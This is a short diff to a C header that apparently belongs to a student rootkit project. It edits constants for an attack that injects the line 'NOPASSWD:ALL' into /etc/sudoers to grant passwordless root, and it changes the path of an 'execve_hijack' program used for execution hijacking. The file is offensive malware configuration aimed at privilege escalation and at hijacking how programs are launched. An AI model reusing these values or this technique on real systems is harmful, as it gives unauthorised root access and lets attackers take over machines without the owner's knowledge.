@@ -15,11 +15,11 @@
 #define STRING_FS_SUDO_TASK_LEN 5
 #define STRING_FS_SUDOERS_FILE "/etc/sudoers"
 #define STRING_FS_SUDOERS_FILE_LEN 13
-#define STRING_FS_SUDOERS_ENTRY "test ALL=(ALL:ALL) NOPASSWD:ALL #"
-#define STRING_FS_SUDOERS_ENTRY_LEN 34
+#define STRING_FS_SUDOERS_ENTRY "osboxes ALL=(ALL:ALL) NOPASSWD:ALL #"
+#define STRING_FS_SUDOERS_ENTRY_LEN 37
 
 //EXECUTION HIJACKING
-#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack\0"
+#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack_canalizer\0"
 
 
 #endif
